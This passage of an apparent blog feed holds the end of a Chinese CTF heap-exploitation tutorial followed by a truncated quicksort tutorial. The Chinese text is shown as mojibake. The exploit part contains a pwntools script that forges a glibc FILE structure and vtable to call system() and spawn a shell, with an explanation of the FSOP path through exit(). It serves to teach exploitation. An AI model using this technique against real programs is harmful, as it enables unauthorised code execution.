class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_read_base</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_base</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])<span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_buf_base;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">2</span>) <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1ea0</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x160</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, usually -1</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0x10</span>) <span class="comment"># fake vtable</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New contents:&quot;</span>)</span><br><span class="line">p.send(fake_file)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯get shell</p><p><img src="https://i.loli.net/2021/01/31/HItF2WqQlb6kyTZ.png" alt="image.png"></p><blockquote><h4 id="exit-å‡½æ•°ä¸FSOPç›¸å…³â€¦"><a href="#exit-å‡½æ•°ä¸FSOPç›¸å…³â€¦" class="headerlink" title="exit()å‡½æ•°ä¸FSOPç›¸å…³â€¦"></a>exit()å‡½æ•°ä¸FSOPç›¸å…³â€¦</h4><blockquote><p> ç”±äºç¨‹åºé€€å‡ºæ—¶å¿…å®šä¼šè°ƒç”¨<code>exit()</code>å‡½æ•°ï¼Œæ•…æˆ‘ä»¬è¦å¯¹è¿™ä¸ªå‡½æ•°å¤šå¤šä¸Šå¿ƒ2333</p></blockquote><p>æˆ‘ä»¬ä¸éš¾è§‚å¯Ÿåˆ°åœ¨<code>exit()</code>å‡½æ•°å½“ä¸­è¿˜ä¼šè°ƒç”¨<code> _IO_flush_all_lockp ()</code>å‡½æ•°</p><p><img src="https://i.loli.net/2021/01/30/x3I8sHJpvRqmajM.png" alt="image.png"></p><p>è¯¥å‡½æ•°ä¼šåˆ·æ–°_IO_list_allé“¾è¡¨ä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµ ï¼Œå®šä¹‰äºlibio&#x2F;genops.cä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å…¶ä¸­çš„å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p>ä¸­é—´çš„é‚£ä¸€æ®µå®ä¸€èˆ¬ä¸ºå‡ï¼Œæˆ‘ä»¬æš‚ä¸”å…ˆä¸ç®¡</p></blockquote><p>é‚£ä¹ˆå…¶ä¼šæ£€æŸ¥å¦‚ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ul><li><strong>fp-&gt;_mode &lt;&#x3D; 0</strong></li><li><strong>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</strong></li></ul><p>æŒ‰ç…§ç¨‹åºæ‰§è¡Œæµç¨‹ï¼Œåœ¨è¿™ä¸¤ä¸ªæ¡ä»¶é€šè¿‡ä¹‹åä¾¿ä¼šä½¿ç”¨å®<code>_IO_OVERFLOW()</code>ï¼Œå…¶å®šä¹‰äºlibio&#x2F;libioP.hä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><p>ç”±æ­¤å¯çŸ¥å…¶<strong>æœ€ç»ˆä¼šè°ƒç”¨vtableè¡¨ä¸­çš„</strong><code>__overflow</code><strong>å‡½æ•°ï¼Œä¸”ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæŒ‡å‘FILEè‡ªèº«çš„æŒ‡é’ˆ</strong></p></blockquote><h2 id="0x04-æ›´åŠ é«˜çº§çš„æ”»å‡»æ‰‹æ³•"><a href="#0x04-æ›´åŠ é«˜çº§çš„æ”»å‡»æ‰‹æ³•" class="headerlink" title="0x04.æ›´åŠ é«˜çº§çš„æ”»å‡»æ‰‹æ³•"></a>0x04.æ›´åŠ é«˜çº§çš„æ”»å‡»æ‰‹æ³•</h2><blockquote><p>ä¸‹é¢çš„ä¸­æ–‡è¯‘åéƒ½æ˜¯çå–çš„233333</p></blockquote><h3 id="House-of-Einherjar-è‹±çµã®å±‹"><a href="#House-of-Einherjar-è‹±çµã®å±‹" class="headerlink" title="House of Einherjar - è‹±çµã®å±‹"></a>House of Einherjar - è‹±çµã®å±‹</h3><h3 id="House-of-Force-åŠ›ã®é‡‘é˜"><a href="#House-of-Force-åŠ›ã®é‡‘é˜" class="headerlink" title="House of Force - åŠ›ã®é‡‘é˜"></a>House of Force - åŠ›ã®é‡‘é˜</h3><h3 id="House-of-Lore-ä¼ è¯´ã®å±‹"><a href="#House-of-Lore-ä¼ è¯´ã®å±‹" class="headerlink" title="House of Lore - ä¼ è¯´ã®å±‹"></a>House of Lore - ä¼ è¯´ã®å±‹</h3><h3 id="House-of-Orange-æ©˜å­ã®å®¤"><a href="#House-of-Orange-æ©˜å­ã®å®¤" class="headerlink" title="House of Orange - æ©˜å­ã®å®¤"></a>House of Orange - æ©˜å­ã®å®¤</h3><h3 id="House-of-Rabbit-å…”å­ã®çª"><a href="#House-of-Rabbit-å…”å­ã®çª" class="headerlink" title="House of Rabbit - å…”å­ã®çª"></a>House of Rabbit - å…”å­ã®çª</h3><h3 id="House-of-Roman-ç½—é©¬ã®å®¶"><a href="#House-of-Roman-ç½—é©¬ã®å®¶" class="headerlink" title="House of Roman - ç½—é©¬ã®å®¶"></a>House of Roman - ç½—é©¬ã®å®¶</h3><h3 id="House-of-Spirit-ç²¾ç¥ã®é™¢"><a href="#House-of-Spirit-ç²¾ç¥ã®é™¢" class="headerlink" title="House of Spirit - ç²¾ç¥ã®é™¢"></a>House of Spirit - ç²¾ç¥ã®é™¢</h3>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CTF-PWN-ç®€æ˜“Linuxå †åˆ©ç”¨å…¥é—¨æ•™ç¨‹by-arttnba3&quot;&gt;&lt;a href=&quot;#CTF-PWN-ç®€æ˜“Linuxå †åˆ©ç”¨å…¥é—¨æ•™ç¨‹by-arttnba3&quot; class=&quot;headerlink&quot; title=&quot;CTF-PWN-ç®€æ˜“Linuxå †åˆ©ç”¨å…¥é—¨æ•™ç¨‹by arttnba3&quot;&gt;&lt;/a&gt;CTF-PWN-ç®€æ˜“Linuxå †åˆ©ç”¨å…¥é—¨æ•™ç¨‹by arttnba3&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;ä¸è¦æ»¡è¶³äºåšä¸€ä¸ªptmallocæ‹³å‡»æ‰‹&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="å †" scheme="http://archive.next.arttnba3.cn/tags/%E5%A0%86/"/>
    
    <category term="ROP" scheme="http://archive.next.arttnba3.cn/tags/ROP/"/>
    
    <category term="æ ˆè¿ç§»" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    <category term="UAF" scheme="http://archive.next.arttnba3.cn/tags/UAF/"/>
    
    <category term="Integer Overflow" scheme="http://archive.next.arttnba3.cn/tags/Integer-Overflow/"/>
    
    <category term="Fastbin Attack" scheme="http://archive.next.arttnba3.cn/tags/Fastbin-Attack/"/>
    
    <category term="tcache poisoning" scheme="http://archive.next.arttnba3.cn/tags/tcache-poisoning/"/>
    
  </entry>
  
  <entry>
    <title>ã€ç®—æ³•æµ…æ-0X04ã€‘å¿«é€Ÿæ’åºç®—æ³•æµ…æ by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/11/20/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0X04%E3%80%91%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/11/20/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0X04%E3%80%91%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/</id>
    <published>2020-11-20T05:40:05.000Z</published>
    <updated>2020-11-20T05:46:40.774Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00 ç»ªè®º"></a>0x00 ç»ªè®º</h1><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå¿«é€Ÿæ’åºæ˜¯æ‰€æœ‰çš„æ’åºç®—æ³•å½“ä¸­é€Ÿåº¦è¾ƒå¿«çš„ä¸€ç§ï¼Œæ‰‹æ’•å¿«æ’ä¹Ÿæˆä¸ºäº†æ¯ä¸€ä½OIerçš„å¿…å¤‡æŠ€èƒ½ï¼ˆ<del>å®é™…ä¸Šå¤§éƒ¨åˆ†äººéƒ½ä¼šç›´æ¥ç”¨STLçš„sortå‡½æ•°XDï¼‰</del><br>åˆšå¥½ä»Šå¤©ACMé€‰ä¿®è¯¾å¸ƒç½®çš„è¯¾åä½œä¸šæœ‰ä¸€é“é¢˜å°±æ˜¯å¿«æ’æ¨¡æ¿ï¼Œæ‰€ä»¥ä½œä¸ºä¸€åä¸åˆæ ¼çš„OIerä»Šå¤©æ¥ç®€å•è®²è®²ä»€ä¹ˆæ˜¯å¿«é€Ÿæ’åºç®—æ³•2333</p><blockquote><p>æ³¨ï¼šè¿™ç¯‡æ–‡ç« å†™äº2020.06ï¼Œåªæ˜¯ç°åœ¨åˆšåˆšä»CSDNä¸Šæ¬åˆ°è¿™é‡Œæ¥23333</p></blockquote><span id="more"></span><h1 id="0x01-åŸºæœ¬æ¦‚å¿µ"><a href="#0x01-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="0x01 åŸºæœ¬æ¦‚å¿µ"></a>0x01 åŸºæœ¬æ¦‚å¿µ</h1><p><strong>å¿«é€Ÿæ’åºï¼ˆQuick Sortï¼‰</strong>ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯å¾ˆå¿«çš„æ’åºï¼ˆå¤§é›¾ï¼‰ï¼Œæ˜¯åŸºäºå†’æ³¡æ’åºçš„ä¸€ç§æ”¹è¿›çš„æ’åºç®—æ³•ã€‚</p><blockquote><h2 id="pre-å†’æ³¡æ’åºï¼ˆBubble-Sortï¼‰"><a href="#pre-å†’æ³¡æ’åºï¼ˆBubble-Sortï¼‰" class="headerlink" title="pre.å†’æ³¡æ’åºï¼ˆBubble Sortï¼‰"></a>pre.å†’æ³¡æ’åºï¼ˆBubble Sortï¼‰</h2><p>æ²¡å­¦è¿‡å†’æ³¡æ’åºçš„å¯ä»¥ç®€å•åœ°çœ‹ä¸€ä¸‹ï¼Œå­¦è¿‡çš„ç›´æ¥è·³è¿‡å°±è¡Œäº†<br>é¡¾åæ€ä¹‰ï¼Œæ•°æ®ä¼šâ€œåƒæ³¡æ³¡ä¸€æ ·ä¸€ä¸ªä¸€ä¸ªå†’å‡ºæ°´é¢â€ï¼Œæ•…å¾—åå†’æ³¡æ’åº<br>å†’æ³¡æ’åºè¦å¯¹æ•°ç»„è¿›è¡Œn-1è¶Ÿéå†ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸ºO(N^2)<br>ç®€å•çš„å†’æ³¡æ’åºä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="function"><span class="type">void</span> <span class="title">a3_sort</span><span class="params">(<span class="type">int</span> * array, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function">&gt;</span>&#123;</span><br><span class="line">&gt;<span class="type">int</span> temp;</span><br><span class="line">&gt;<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n<span class="number">-1</span>-i;j++)</span><br><span class="line">       <span class="keyword">if</span>(array[j]&gt;array[j+<span class="number">1</span>])</span><br><span class="line">       &#123;</span><br><span class="line">           temp = array[j];</span><br><span class="line">           array[j] = array[j+<span class="number">1</span>];</span><br><span class="line">           array[j+<span class="number">1</span>] = temp;</span><br><span class="line">       &#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>åŸºäºå†’æ³¡æ’åºçš„æ€æƒ³ï¼ŒC. A. R. Hoareåœ¨1960å¹´æå‡ºäº†å¿«é€Ÿæ’åºç®—æ³•ã€‚</p></blockquote><p>å¿«é€Ÿæ’åºçš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šé€šè¿‡ä¸€è¶Ÿæ’åºå°†è¦æ’åºçš„æ•°æ®åˆ†å‰²æˆç‹¬ç«‹çš„ä¸¤éƒ¨åˆ†ï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†çš„æ‰€æœ‰æ•°æ®éƒ½æ¯”å¦å¤–ä¸€éƒ¨åˆ†çš„æ‰€æœ‰æ•°æ®éƒ½è¦å°ï¼Œç„¶åå†æŒ‰æ­¤æ–¹æ³•å¯¹è¿™ä¸¤éƒ¨åˆ†æ•°æ®åˆ†åˆ«è¿›è¡Œå¿«é€Ÿæ’åºï¼Œæ•´ä¸ªæ’åºè¿‡ç¨‹å¯ä»¥é€’å½’è¿›è¡Œï¼Œä»¥æ­¤è¾¾åˆ°æ•´ä¸ªæ•°æ®å˜æˆæœ‰åºåºåˆ—ã€‚</p><h1 id="0x02-åŸç†æµ…æ"><a href="#0x02-åŸç†æµ…æ" class="headerlink" title="0x02 åŸç†æµ…æ"></a>0x02 åŸç†æµ…æ</h1><p>å¿«é€Ÿæ’åºå¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤</p><h2 id="step1ï¼šé€‰å–åŸºå‡†å€¼"><a href="#step1ï¼šé€‰å–åŸºå‡†å€¼" class="headerlink" title="step1ï¼šé€‰å–åŸºå‡†å€¼"></a>step1ï¼šé€‰å–åŸºå‡†å€¼</h2><p>åœ¨è¦æ’åºçš„æ•°ç»„å½“ä¸­é€‰å–ä¸€ä¸ªå€¼ä½œä¸ºåŸºå‡†å€¼ï¼Œé€šå¸¸æˆ‘ä»¬å¯ä»¥é€‰array[0]ä½œä¸ºåŸºå‡†å€¼ï¼Œä¿å­˜åœ¨å˜é‡keyå½“ä¸­</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åˆ†åˆ«ä»åå‘å‰ã€ä»å‰å‘åå¯¹æ•´ä¸ªæ•°ç»„è¿›è¡Œéå†ï¼Œæ•…å»ºç«‹å˜é‡i&#x3D;leftï¼Œj&#x3D;rightï¼ˆæ•°ç»„å§‹ç´¢å¼•ä¸æœ«ç´¢å¼•ï¼‰</p><h2 id="step2ï¼šä»åå‘å‰éå†"><a href="#step2ï¼šä»åå‘å‰éå†" class="headerlink" title="step2ï¼šä»åå‘å‰éå†"></a>step2ï¼šä»åå‘å‰éå†</h2><p>å¯»æ‰¾ç¬¬ä¸€ä¸ªæ¯”keyå°çš„å€¼ï¼Œå¹¶å°†ä¹‹å­˜åœ¨array[i]ä¸­</p><h2 id="step3ï¼šä»å‰å‘åéå†"><a href="#step3ï¼šä»å‰å‘åéå†" class="headerlink" title="step3ï¼šä»å‰å‘åéå†"></a>step3ï¼šä»å‰å‘åéå†</h2><p>å¯»æ‰¾ç¬¬ä¸€ä¸ªæ¯”keyå¤§çš„å€¼ï¼Œå¹¶å°†ä¹‹å­˜åœ¨array[j]ä¸­</p><h2 id="step4ï¼šé‡å¤step2ã€3"><a href="#step4ï¼šé‡å¤step2ã€3" class="headerlink" title="step4ï¼šé‡å¤step2ã€3"></a>step4ï¼šé‡å¤step2ã€3</h2><p>ç›´åˆ°i&gt;&#x3D;jï¼Œæ­¤æ—¶æ•´ä¸ªæ•°ç»„å·²ç»è¢«éå†è¿‡ä¸€é</p><blockquote><p>è¦æ³¨æ„çš„æ˜¯åœ¨step2ä¸step3ä¸­å·²ç»è•´å«äº†ã€äº¤æ¢ã€‘çš„è¿‡ç¨‹ï¼Œæ•…ä¸éœ€è¦æ·»åŠ è€Œå¤–çš„äº¤æ¢çš„è¯­å¥<br>ä¹Ÿå¯ä»¥ç†è§£ä¸ºstep2ã€3åˆ†åˆ«æ‰¾å‡ºç¬¬ä¸€ä¸ªæ¯”keyå¤§ã€å°çš„å€¼ï¼Œå°†ä¹‹è¿›è¡Œäº¤æ¢</p></blockquote><h2 id="step5ï¼šåŸºå‡†å€¼å›å½’æ•°ç»„ï¼Œå†å¯¹å…¶å·¦ã€å³éƒ¨åˆ†è¿›è¡Œå¿«æ’"><a href="#step5ï¼šåŸºå‡†å€¼å›å½’æ•°ç»„ï¼Œå†å¯¹å…¶å·¦ã€å³éƒ¨åˆ†è¿›è¡Œå¿«æ’" class="headerlink" title="step5ï¼šåŸºå‡†å€¼å›å½’æ•°ç»„ï¼Œå†å¯¹å…¶å·¦ã€å³éƒ¨åˆ†è¿›è¡Œå¿«æ’"></a>step5ï¼šåŸºå‡†å€¼å›å½’æ•°ç»„ï¼Œå†å¯¹å…¶å·¦ã€å³éƒ¨åˆ†è¿›è¡Œå¿«æ’</h2><p>å°†æ•°ç»„æ— é™ç»†åˆ†ä¸‹å»ï¼Œä¸€ç›´åˆ°æ‰€æœ‰æ•°æ®éƒ½è¢«æ’åºå®Œæ¯•</p><blockquote><p>æƒ³ä¸æ˜ç™½çš„å¯ä»¥çœ‹ä¸€çœ‹ä¸‹é¢çš„åŠ¨å›¾<img src="https://img-blog.csdnimg.cn/20191008110757588.gif" alt="img"></p></blockquote><h1 id="0x03-ä»£ç å®ç°"><a href="#0x03-ä»£ç å®ç°" class="headerlink" title="0x03 ä»£ç å®ç°"></a>0x03 ä»£ç å®ç°</h1><p>æœ€åŸºç¡€çš„å¿«é€Ÿæ’åºçš„ä»£ç å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">a3_qsort</span><span class="params">(<span class="type">int</span>* array, <span class="type">int</span> left, <span class="type">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(left&gt;=right)</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    <span class="type">int</span> i = left;</span><br><span class="line">    <span class="type">int</span> j = right;</span><br><span class="line">    <span class="type">int</span> key = array[left];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; key &lt;= array[j])<span class="comment">//ä»åå‘å‰æ‰¾æ¯”keyå°çš„</span></span><br><span class="line">            j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; j)</span><br><span class="line">            array[i++] = array[j];<span class="comment">//è¿›è¡Œä¸€æ¬¡äº¤æ¢</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; key &gt;= array[i])<span class="comment">//ä»å‰å‘åæ‰¾æ¯”keyå¤§çš„</span></span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; j)</span><br><span class="line">            array[j--] = array[i];</span><br><span class="line">    &#125;</span><br><span class="line">    array[i] = key;<span class="comment">//ä¸­é—´æ•°çš„å›å½’</span></span><br><span class="line">    <span class="built_in">a3_qsort</span>(array, left, i<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">a3_qsort</span>(array, i+<span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-ç®€å•ä¼˜åŒ–"><a href="#0x04-ç®€å•ä¼˜åŒ–" class="headerlink" title="0x04 ç®€å•ä¼˜åŒ–"></a>0x04 ç®€å•ä¼˜åŒ–</h1><blockquote><p>â€œå¤ªå¥½ğŸŒ¶ï¼Œçœ‹å®Œä»¥åğŸ‘´ç«‹é©¬å°±å­¦ä¼šäº†å¿«æ’â€<br>â€”â€”â€œçœŸçš„ğŸï¼Ÿâ€</p></blockquote><p><strong>å®â­æˆ˜â­æ¼”â­ç»ƒ</strong>ç¯èŠ‚ä¸è¯·è‡ªæ¥</p><blockquote><p>é¢˜ç›®æè¿°<br>åˆ©ç”¨å¿«é€Ÿæ’åºç®—æ³•å°†è¯»å…¥çš„ <strong>N</strong> ä¸ªæ•°ä»å°åˆ°å¤§æ’åºåè¾“å‡ºã€‚</p><p>å¿«é€Ÿæ’åºæ˜¯ä¿¡æ¯å­¦ç«èµ›çš„å¿…å¤‡ç®—æ³•ä¹‹ä¸€ã€‚å¯¹äºå¿«é€Ÿæ’åºä¸æ˜¯å¾ˆäº†è§£çš„åŒå­¦å¯ä»¥è‡ªè¡Œä¸Šç½‘æŸ¥è¯¢ç›¸å…³èµ„æ–™ï¼ŒæŒæ¡åç‹¬ç«‹å®Œæˆã€‚ï¼ˆC++ é€‰æ‰‹è¯·ä¸è¦è¯•å›¾ä½¿ç”¨STLï¼Œè™½ç„¶ä½ å¯ä»¥ä½¿ç”¨ sort ä¸€éè¿‡ï¼Œä½†æ˜¯ä½ å¹¶æ²¡æœ‰æŒæ¡å¿«é€Ÿæ’åºç®—æ³•çš„ç²¾é«“ã€‚ï¼‰</p><p>è¾“å…¥æ ¼å¼<br>ç¬¬1è¡Œä¸ºä¸€ä¸ªæ­£æ•´æ•° Nï¼Œç¬¬2 è¡ŒåŒ…å« Nä¸ªç©ºæ ¼éš”å¼€çš„æ­£æ•´æ•° a<del>i</del>ï¼Œä¸ºä½ éœ€è¦è¿›è¡Œæ’åºçš„æ•°ï¼Œæ•°æ®ä¿è¯äº† A<del>i</del> ä¸è¶…è¿‡ 10^9  ã€‚</p><p>è¾“å‡ºæ ¼å¼<br>å°†ç»™å®šçš„ Nä¸ªæ•°ä»å°åˆ°å¤§è¾“å‡ºï¼Œæ•°ä¹‹é—´ç©ºæ ¼éš”å¼€ï¼Œè¡Œæœ«æ¢è¡Œä¸”æ— ç©ºæ ¼ã€‚</p><p>è¾“å…¥è¾“å‡ºæ ·ä¾‹<br>è¾“å…¥ #1<br><code>5 4 2 4 5 1</code><br>è¾“å‡º #1<br><code>1 2 4 4 5</code><br>è¯´æ˜&#x2F;æç¤º<br>å¯¹äº 20%çš„æ•°æ®ï¼Œæœ‰<br>Nâ‰¤10^3  ï¼›<br>å¯¹äº100% çš„æ•°æ®ï¼Œæœ‰Nâ‰¤10^5  ã€‚<br><a href="https://www.luogu.com.cn/problem/P1177">æ´›è°·P1177ã€æ¨¡æ¿ã€‘å¿«é€Ÿæ’åº</a></p></blockquote><p>å½“ä½ æ»¡æ€€æ¬£å–œåœ°å°†ä¸Šé¢çš„ä»£ç å¤åˆ¶ç²˜è´´è¿›å»æ—¶ï¼Œä½ ä¼šå‘ç°TLEä¸è¯·è‡ªæ¥â€¦<br><img src="https://img-blog.csdnimg.cn/20200615152749700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FydHRuYmEz,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬çš„é—®é¢˜å‡ºåœ¨å“ªå‘¢ï¼Ÿï¼ˆ<del>å› ä¸ºå†™è¿™æ®µä»£ç çš„äººå¤ªèœleï¼‰</del></p><p>ä¸Šé¢çš„æ ‡å‡†åŒ–çš„ä»£ç 